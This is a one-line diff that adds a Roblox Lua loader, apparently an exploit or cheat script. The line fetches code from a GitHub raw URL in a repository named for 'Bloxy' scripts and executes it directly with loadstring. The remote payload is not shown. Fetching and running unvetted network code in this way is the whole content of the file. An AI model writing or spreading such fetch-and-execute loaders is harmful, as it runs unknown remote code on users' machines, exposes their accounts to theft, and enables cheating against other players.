@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kanyeeats/BloxyScriptsNOKEY/refs/heads/main/8f27c221c160a7183d231fc278a5af7b.txt"))()
